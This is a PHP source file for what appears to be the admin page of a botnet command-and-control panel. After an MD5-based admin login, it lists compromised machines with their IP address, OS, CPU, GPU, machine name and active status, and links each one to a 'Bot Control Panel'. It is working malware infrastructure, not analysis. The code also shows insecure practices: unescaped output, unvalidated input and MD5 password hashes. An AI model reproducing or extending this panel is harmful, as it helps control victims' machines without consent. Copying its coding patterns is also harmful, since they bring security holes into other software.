<?php 
 require_once('assets/config.php');
 session_start();
 ini_set('session.bug_compat_warn', 0);
 ini_set('session.bug_compat_42', 0);

 $query = $mysqli->query("SELECT COUNT(1) FROM admin");
 $cadmin = $query->fetch_array();
 
 $hAuth = false;
 if (isset($_POST['submit-button'])) {
  for($i = 1; $i <= $cadmin[0]; $i++) {
   $query = $mysqli->query("SELECT * FROM admin WHERE id='$i'");
   $admin = $query->fetch_assoc();
   if(($_POST['login-field'] == $admin['login']) and (md5($_POST['password-field']) == $admin['password'])) {
    $hAuth = true;
    $_SESSION['login'] = $admin['login'];
    $_SESSION['password'] = $admin['password'];
   }
  }
 } else {
  for($i = 1; $i <= $cadmin[0]; $i++) {
   $query = $mysqli->query("SELECT * FROM admin WHERE id='$i'");
   $admin = $query->fetch_assoc();
   if(($_SESSION['login'] == $admin['login']) and ($_SESSION['password'] == $admin['password'])) { 
    $hAuth = true; 
    break;
   }
  }
 }
 if($hAuth == false) { header("Location: login.php"); exit; } 

 //-<Handling>-//
 
 $onpage = 25;
 if(isset($_POST['onpageinput'])) {
  $onpage = $_POST['onpageinput'];
 }

 //-<Handling>-//
?>
<html>
 <head>
  <title>- Home -</title>
  <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="assets/css/style.css" media="screen" type="text/css" />
  <link rel="stylesheet" href="assets/css/tables.css" media="screen" type="text/css" />
 </head>
 <body>
  <nav class="admin-header">
   <input class="admin-header-button" style="float: right;" type="button" value="Logout" onClick='location.href="logout.php"'>
   <div class="admin-header-login"><?php echo $_SESSION['login']; ?></div>
  </nav>
  
  <div class="admin-box">
   Total users:
   <?php 
    $query = $mysqli->query("SELECT COUNT(1) FROM users");
    $cusers = $query->fetch_array();
    echo $cusers[0];
   ?>
   <form style="display: inline;" method="post" action="admin.php">
    <button class="on-page-button" onclick='showonpage()'>Show</button>&nbsp;
    <input class="on-page-slider" name='onpageinput' type='number' id='onpageinput' value=25>
   </form>
  </div>
  
  <table class='table-menu' id='update-table'>    
   <tr><th>Tag</th><th>User-ID</th><th>Operating System</th><th>Digit</th><th>IP-Address</th><th>Processor</th><th>Video Controller</th><th>Machine Name</th><th>Status</th></tr> 
  <?php
    $query = $mysqli->query("SELECT MAX(id) FROM users");
    $user = $query->fetch_array();
    $index = $user[0];
    
    while($onpage != 0) {
     $query = $mysqli->query("SELECT * FROM users WHERE id='$index'");
     $user = $query->fetch_assoc();

     if($user['uid'] != null) {
      $userid = $user['uid'];
      echo "<tr>";
      echo "<td>".$user['tag']."</td>";
      echo "<td><p class=\"text-control\" onClick='location.href=\"control.php?id=$userid\"'  title=\"Bot Control Panel\">".$user['uid']."</p></td>";
      echo "<td>".$user['os']."</td>";
      echo "<td>".$user['digit']."</td>";
      echo "<td>".$user['ip']."</td>";
      echo "<td>".$user['cpu']."</td>";
      echo "<td>".$user['gpu']."</td>";
      echo "<td>".$user['cname']."</td>";
      if(substr($user['lresp'], 0, 10) == date("d-m-Y") and
   		 strtotime(substr($user['lresp'], 12, 8)) + 5 >= strtotime(date("h:i:s"))) {
      	echo "<td><b class=\"green\">Active</b></td>";
      } else {
		echo "<td><b class=\"red\">Inactive</b></td>";
      }

      echo "</tr>";
      $onpage--;
     }

     $index--;
     if($index == 0) { break; }
    }
    ?>
  </table>
 </body>
</html>